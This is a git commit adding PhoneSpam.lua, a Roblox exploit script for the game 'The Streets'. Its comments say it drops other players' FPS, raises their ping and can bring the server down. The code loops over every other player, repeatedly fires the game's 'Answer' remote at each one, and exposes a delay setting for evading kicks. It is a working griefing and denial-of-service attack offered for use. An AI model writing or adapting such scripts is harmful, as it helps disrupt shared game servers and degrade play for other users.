f41fd6a722e6059819670165cdf5f1b7a9a22eda
lodemy <125163933+lodemy@users.noreply.github.com>
2023-02-19 00:42:50 -0500

    Create PhoneSpam.lua

---
+++ Roblox/Scripts/The Streets/PhoneSpam.lua
@@ -0,0 +1,26 @@
+-- // This script will drop everyones FPS and increase their ping, more people = server dies faster
+
+getgenv().SpamDelay = 3 -- // Increase this if it kicks you
+if not game:IsLoaded() then game.Loaded:Wait(); end
+
+-- // Services
+local ReplicatedStorage = game:GetService("ReplicatedStorage");
+local RunService = game:GetService("RunService");
+local Players = game:GetService("Players");
+
+-- // Variables
+local Client = Players.LocalPlayer
+
+local Remotes = ReplicatedStorage:FindFirstChild("Remotes");
+local Answer = Remotes:FindFirstChild("Answer");
+
+-- // Connections
+RunService.PostSimulation:Connect(function(deltaTime) 
+    for i = 1, #Players:GetPlayers() do     
+        local Player = Players:GetPlayers()[i];
+        if Player == Client then continue end 
+    
+        Answer:FireServer(Player);
+        task.wait(getgenv().SpamDelay or 3)
+    end
+end);
